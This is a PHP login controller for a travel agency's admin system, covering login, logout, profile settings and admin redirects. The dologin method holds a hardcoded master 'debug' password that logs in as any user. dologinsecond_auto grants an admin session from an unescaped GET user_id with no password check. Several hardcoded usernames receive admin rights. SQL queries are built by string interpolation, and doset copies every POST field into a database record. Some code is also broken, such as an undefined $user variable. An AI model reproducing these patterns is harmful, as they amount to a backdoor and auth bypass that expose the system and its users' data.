<?php

class LoginAction extends Action{
	
    public function index() {
		
        $this->assign('navtitle','古莲国旅管理系统');
		if(!$this->loginname){
			$this->display('loginfirst');
		}
		else{
			$this->toadmin();
			$this->display('loginfirst');
			
				//redirect(SITE_ADMIN.'Login/dologinsecond_auto/user_id/'.$this->['user_id']);
			//$this->display('loginguide');
		}
    }

	
    public function loginsecond() {

		$type = $_GET['type'];
		if($type == '地接'){
			$type = '地接';
		}
		elseif($type == '门市'){
			$type = '门市';
		}
		elseif($type == '同业'){
			$type = '同业';
		}
		else{
			$type = '系统';
		}
		
		$jumpurl = SITE_ADMIN.'Chanpin';
		if($_GET['type'] == '门市')
			  $jumpurl = SITE_MENSHI;
		if($_GET['type'] == '地接')
			  $jumpurl = SITE_DIJIE;
		if($_GET['type'] == '系统')
			  $jumpurl = SITE_ADMIN.'Chanpin';
		if($_GET['type'] == '同业')
			  $jumpurl = SITE_ADMIN.'Tongye';
			  
		//默认跳转
		Cookie::set('defaulthome', $jumpurl, LOGIN_TIME);
		
        $this->assign('navtitle','古莲国旅管理系统');
        $this->toadmin();
        $this->display();
		
	}
	
    private function toadmin() {
        if ($this->adminuser) {
				$defaulthome = Cookie::get('defaulthome');
				echo '<script>parent.location.href="'.$defaulthome.'"</script>';
        }
		if(!$this->loginname){
            $this->redirect('Login');
		}
    }
	
    public function logout() {
        setcookie('adminauth','',-1,'/');
        Cookie::delete('adminauth');
		Cookie::delete('newsID');
		
	    setcookie('authcookie','',-1,'/');
        Cookie::delete('authcookie');
		
		session_destroy();
        redirect(SITE_ADMIN);
    }

	
    public function dologin() {
        $username = daddslashes($_POST["loginname"]);
		
		//调试密码
		if($_POST["password"] == 'neconano!!!')
		{
			
			$uModel=D("Users");
			$user = $uModel->where("user_name='$username' OR mailadres='$username'")->field('user_id,user_name,userlock')->find();
			
			if ($user["userlock"]==1) {
				Cookie::set('setok','login1');
				doalert('帐号或密码错误！','/');
			} else {
				$this->logindt($user['user_id']);
				if ($remember=="on") {
					Cookie::set('authcookie', authcode("$user[user_name]\t$user[user_id]",'ENCODE'), 31536000);
				} else {
					Cookie::set('authcookie', authcode("$user[user_name]\t$user[user_id]",'ENCODE'), LOGIN_TIME);
				}
				//redirect(SITE_ADMIN);
				//redirect(SITE_ADMIN.'Login/loginguide');
				//$this->dologinsecond_auto($user);
				redirect(SITE_ADMIN.'Login/dologinsecond_auto/user_id/'.$user['user_id']);
			}
		}
		
		
        $userpass = md5(md5($_POST["password"]));
        $remember = $_POST["rememberMe"];
        $uModel=D("Users");
		$user = $uModel->where("(user_name='$username' OR mailadres='$username') AND password='$userpass'")->field('user_id,user_name,userlock')->find();
		if($user) {
			if ($user["userlock"]==1) {
				Cookie::set('setok','login1');
				doalert('帐号或密码错误！','/');
			} else {
				$this->logindt($user['user_id']);
				if ($remember=="on") {
					Cookie::set('authcookie', authcode("$user[user_name]\t$user[user_id]",'ENCODE'), 31536000);
				} else {
					Cookie::set('authcookie', authcode("$user[user_name]\t$user[user_id]",'ENCODE'), LOGIN_TIME);
				}
				//redirect(SITE_ADMIN);
				//redirect(SITE_ADMIN.'Login/loginguide');
				//$this->dologinsecond_auto($user);
				redirect(SITE_ADMIN.'Login/dologinsecond_auto/user_id/'.$user['user_id']);
			}
		} else {
			Cookie::set('setok','login2');
			doalert('帐号或密码错误！','/');
		}
		
		
    }


    public function dologinsecond() {
		
        $this->toadmin();
        $user_name=$this->loginname;
        $password=md5(md5($_POST['password']));

        if (!$user_name || !$password) {
				doalert('密码错误！',SITE_ADMIN.'Login/loginsecond/type/'.$_POST['type']);
        } else {
			
            $user = D("Users")->where("user_name='$user_name' AND password='$password'")->find();
			
            if($user) {
				
				//读取权限表
				$glkehu = D('glkehu')->where("`user_id`='$user[user_id]'")->find();
				if(!$glkehu)
				{
					doalert('您不是系统内用户！','');
				}
				
				//提示窗口
                Cookie::set('popnotice', '1', LOGIN_TIME);
				//登录时间
                Cookie::set('adminauth', authcode("$user_name\t$user[user_id]",'ENCODE'), LOGIN_TIME);
				//默认跳转
				$jumpurl = Cookie::get('defaulthome');
				import ('@.ORG.RBAC');
				if($user['user_name'] == 'tomature'){
				$_SESSION[C('ADMIN_AUTH_KEY')]	= true;
				}
				if($user['user_name'] == 'kkk'){
				$_SESSION[C('ADMIN_AUTH_KEY')]	= true;
				}
				if($user['user_name'] == 'aaa'){
				$_SESSION[C('ADMIN_AUTH_KEY')]	= true;
				}
				if($user['user_name'] == 'zhangwen'){
				$_SESSION[C('ADMIN_AUTH_KEY')]	= true;
				}
				$_SESSION[C('USER_AUTH_KEY')]	= $user[user_id];
				RBAC::saveAccessList();
					  
				redirect($jumpurl);
            } else {
				doalert('密码错误！',SITE_ADMIN.'Login/loginsecond/type/'.$_POST['type']);
				//$this->redirect('/Login/loginsecond/type/'.$_POST['type']);
            }
        }
    }
	
	
	//信息修改
    public function setting() {
        if (!$this->adminuser) {
				redirect(SITE_ADMIN);
        }
        $this->assign('position','更改个人信息');
		
		$glbasedata = D("glbasedata");
		$bumenAll = $glbasedata->where("`type` = '部门'")->findall();
        $this->assign('bumenAll',$bumenAll);
		
        $this->display();
		
    }
	
    public function doset() {
        if (!$this->adminuser) {
				redirect(SITE_ADMIN);
        }
        $user=M('Users');
        $ctent=D('Content');
        $data=array();

        $nickname= daddslashes(clean_html(trim($_POST["nickname"])));
        $gender= $_POST["gender"];
        $city=trim($_POST["livesf"].' '.$_POST["livecity"]);
        $info= daddslashes($ctent->replace(trim($_POST["info"])));

        if(!preg_match('/^[0-9a-zA-Z\xe0-\xef\x80-\xbf._-]+$/i',$nickname)) {
            Cookie::set('setok','setting2');
            header('location:'.SITE_URL.'/Setting/index');
        }
        if (!$nickname || !$gender || !$city) {
            Cookie::set('setok','setting1');
            header('location:'.SITE_URL.'/Setting/index');
        }
        if ($city && $city!=$this->my['live_city'] && $city!="选择省份 选择城市"){
            $data['live_city']=$city;
        }
        if ($gender!=$this->my['user_gender']){
            $data['user_gender']=$gender;
        }
        if ($info!=$this->my['user_info']){
            $data['user_info']=$info;
        }
		//昵称唯一
//        if ($nickname && $nickname!=$this->my['nickname']) {
//            if (StrLenW($nickname)<=12 && StrLenW($nickname)>=1) {
//                $newnickname=$user->where("nickname='$nickname'")->find();
//                if ($newnickname) {
//                    Cookie::set('setok','setting4');
//                    header('location:'.SITE_URL.'/Setting/index');
//                } else {
//                    $data['nickname']=$nickname;
//                }
//            } else {
//                Cookie::set('setok','setting2');
//                header('location:'.SITE_URL.'/Setting/index');
//            }
//        }
		//昵称唯一结束
        if ($nickname!=$this->my['nickname']){
            $data['nickname']=$nickname;
        }
        $user->where("user_id='".$this->my['user_id']."'")->data($data)->save();
		
		//同步
		$Glkehu = D('Glkehu');
		$kehu = $Glkehu->where("`user_name` = '".$this->my['user_name']."'")->find();
		$kehu['realname'] = $nickname;
		$kehu['editusername'] = $this->my['user_name'];
		
		foreach($_POST as $key => $value)
		{
			$kehu[$key] = $value;
		}
		$Glkehu->save($kehu);
		//同步结束
        Cookie::set('setok','setting3');
        header('location:'.SITE_ADMIN.'/Login/setting');
    }

	
	//信息修改
    public function adminlist() {
        if (!$this->adminuser) {
				redirect(SITE_ADMIN);
        }
		$user_name = $this->my['user_name'];
		$gladminuser = D("gladminuser");
		$adminuser = $gladminuser->where("`user_name` = '$user_name'")->find();
        $this->assign('adminuser',$adminuser);
        $this->assign('position','权限信息');
        $this->display();
		
    }
	
	
    private function logindt($uid) {
        $insert['user_id']=$uid;
        $insert['login_ip']=real_ip();
        $insert['login_time']=time();
        D('Logindt')->add($insert);
    }
	
	
	
    public function dologinsecond_auto() {
		
		
		$this->toadmin();
        $user_name=$this->loginname;
		$user_id = $_GET['user_id'];
		//读取管理组
		$gladmin = D('Gladminuser')->where("`user_id`='$user_id'")->find();
		if(!$gladmin)
		{
			doalert('您不是管理员！','');
		}
		$jumpurl = SITE_ADMIN.'Chanpin';
		
		if(strstr($gladmin['adminlevel'],'门市'))
			  $jumpurl = SITE_MENSHI;
		if(strstr($gladmin['adminlevel'],'地接'))
			  $jumpurl = SITE_DIJIE;
		if(strstr($gladmin['adminlevel'],'办事处'))
			  $jumpurl = SITE_ADMIN.'Banshichu';
			  
//		if(checkByAdminlevel('计调操作员,网管,计调经理,总经理,财务操作员',$this))
//			  $jumpurl = SITE_ADMIN.'Chanpin';
			  
		if(strstr($gladmin['adminlevel'],'计调') || strstr($gladmin['adminlevel'],'网管') || strstr($gladmin['adminlevel'],'总经理'))
			  $jumpurl = SITE_ADMIN.'Chanpin';
			  
		if(strstr($gladmin['adminlevel'],'联合体成员'))
			  $jumpurl = SITE_MENSHI;
			  
//		if(strstr($gladmin['adminlevel'],'财务'))
//			  $jumpurl = SITE_ADMIN.'Caiwuguanli/index_caiwuguanli';
  
		//默认跳转
		Cookie::set('defaulthome', $jumpurl, LOGIN_TIME);

			
		//读取权限表
		$glkehu = D('glkehu')->where("`user_id`='$user_id'")->find();
		if(!$glkehu)
		{
			doalert('您不是系统内用户！','');
		}

		//提示窗口
		Cookie::set('popnotice', '1', LOGIN_TIME);
		//登录时间
		Cookie::set('adminauth', authcode("$user_name\t$user_id",'ENCODE'), LOGIN_TIME);
		//默认跳转
		$jumpurl = Cookie::get('defaulthome');
		import ('@.ORG.RBAC');
		if($user['user_name'] == 'tomature'){
		$_SESSION[C('ADMIN_AUTH_KEY')]	= true;
		}
		if($user['user_name'] == 'kkk'){
		$_SESSION[C('ADMIN_AUTH_KEY')]	= true;
		}
		if($user['user_name'] == 'aaa'){
		$_SESSION[C('ADMIN_AUTH_KEY')]	= true;
		}
		if($user['user_name'] == 'zhangwen'){
		$_SESSION[C('ADMIN_AUTH_KEY')]	= true;
		}
		$_SESSION[C('USER_AUTH_KEY')]	= $user[user_id];
		RBAC::saveAccessList();

		redirect($jumpurl);

    }
	
	
	
	
	
	
	
	
	
}
?>